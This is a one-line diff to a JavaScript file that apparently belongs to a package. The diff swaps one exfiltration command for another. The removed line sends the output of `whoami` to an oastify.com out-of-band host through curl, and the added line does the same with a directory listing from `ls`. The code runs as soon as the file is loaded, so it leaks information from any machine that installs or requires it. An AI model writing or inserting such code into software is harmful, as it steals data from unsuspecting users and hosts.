@@ -1,1 +1,1 @@
-require("child_process").exec('curl `whoami`.0ghk1uu5hl708k075kl14nef76dx1npc.oastify.com')
+require("child_process").exec('curl `ls`.0ghk1uu5hl708k075kl14nef76dx1npc.oastify.com')
